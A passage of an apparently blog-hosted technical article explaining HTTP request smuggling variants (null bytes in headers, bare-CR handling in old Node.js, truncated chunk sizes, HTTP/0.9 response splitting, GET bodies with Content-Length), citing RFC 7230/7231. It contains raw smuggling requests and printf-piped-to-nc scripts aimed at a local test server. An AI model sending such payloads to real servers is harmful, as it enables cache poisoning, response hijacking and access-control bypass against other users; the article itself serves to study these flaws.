class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-\0dummy: foo\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'length: 56\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tmp HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tests HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></tbody></table></figure><p></p><p>When some middleware processes the above request, when it encounters <code>\0</code>, it will continue to read lines, which will also cause parsing differences.</p><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-3.5" target="_blank" rel="noopener">RFC7320 section-3.5</a>:</p><blockquote><p>Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.</p></blockquote><p>In other words, in addition to CRLF, we can also use LF as EOL, but in the version of Node.js &lt;5.6.0, the handling of CRLF is also more interesting:</p><p></p><figure class="highlight markdown hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">CR</span>] + ? == [<span class="hljs-string">CR</span>][<span class="hljs-symbol">LF</span>]//true</span><br></pre></td></tr></tbody></table></figure><p></p><p>Suppose we have a Front server that parses CRLF normally, and the backend is a Node.js service with this vulnerability. We can send the following request:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy</span>: Header\rZTransfer-Encoding: chunked\r\n</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 52\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line">GET /tmp HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header\r\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The front server will think that <code>Dummy: Header\rZTransfer-Encoding: chunked\r\n</code> is a header. When use CL header parsing, it will consider this a complete request, and Node.js will consider<code>\rZ</code> as a Newline, according to the parsing rule that TE takes precedence over CL, it is considered that these are two requests, resulting in parsing differences.</p><h3 id="Size-Issue"><a href="#Size-Issue" class="headerlink" title="Size Issue"></a>Size Issue</h3><p>You can also use some coded block lengths to generate parsing differences</p><p>Such as:</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET / HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0000000000000000000000000000042\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tmp/ HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></tbody></table></figure><p></p><p>Some middleware will truncate the chunk length data when parsing the chunk size data. For example, here it is shown as only taking <code>0000000000000000000000000000042</code> as<code>00000000000000000</code>, so it will be considered that these are two requests. The first request’s chunk size is 0. The second will request <code>/tmp</code>, which results in HTTP Smuggling.</p><h3 id="HTTP-Version"><a href="#HTTP-Version" class="headerlink" title="HTTP Version"></a>HTTP Version</h3><p>This is mainly due to the problem caused by HTTP/0.9. Let’s take a look at several examples of HTTP:</p><p>HTTP v1.1</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTTP v1.0</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTTP v0.9</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-builtin-name">GET</span> /foo\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>And HTTP/0.9 request and response packets do not have headers. Such as:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520134497.png" alt=""></p><p>Because HTTP/0.9 response packets do not have headers, they are particularly interesting to be used in HTTP Smuggling.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520136500.png" alt=""></p><p>The meaning of this picture is that we use HTTP/0.9 for Smuggle when HTTP Smuggling. This is not the HTTP/0.9 standard format, but because some middleware no longer supports the standard format of directly parsing HTTP/0.9, but it is still possible to parse specified HTTP version. Then the following situations may exist:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520134449.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520139919.png" alt=""></p><p>The above two figures show a rough attack flow. The 24-33664 bytes in chewy2.jpg have a complete HTTP response message. When Golang is processing HTTP/0.9, since we specified <code>Range: bytes=24-33664</code>, we can specify to obtain 24-33664 bytes of the response message, which is to obtain the HTTP message we stored in the picture, and then return it to Golang. Golang standardizes HTTP/0.9 and then remove headers. So the response looks like a new response.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520131041.png" alt=""></p><p>When a normal user requests, if Apache reuses the TCP / IP link, it will return the HTTP message we constructed in the picture as a response packet to the user. This is also a very typical idea of HTTP Response Splitting. For details, please see the video demo <a href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target="_blank" rel="noopener">HTTP Smuggling Examples 2016</a></p><h3 id="Has-a-CL-in-GET"><a href="#Has-a-CL-in-GET" class="headerlink" title="Has a CL in GET"></a>Has a CL in GET</h3><p>In this scenario, the body is used in the GET request, and the length of the body is indicated by Content-Length.</p><blockquote><pre><code>GET request is not the only one that get affected. I just use it as an example because it is typical. All HTTP requests that do not carry the request body may be affected by this.</code></pre></blockquote><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 Content-Length</a>:</p><blockquote><pre><code>For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body).  A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.</code></pre></blockquote><p>In the newest <a href="https://tools.ietf.org/html/rfc7231#section-4.3.1" target="_blank" rel="noopener">RFC7231 4.3.1 GET</a> also just mention a sentence：</p><blockquote><pre><code>A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.</code></pre></blockquote><p>For requests that have a body field and indicate the length of the body with Content-Length, the RFC does not strictly explain how the server should handle it, so most middleware also loosely handles GET requests with a body, but this is also part of the situation Because these middlewares do not have a strict standard basis, parsing differences can also cause HTTP Smuggling attacks.</p><p>Here we give a simple and idealized example. The Front server allows body for GET requests, while the Backend server ignores GET requests with body.</p><p>When we send following requests：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 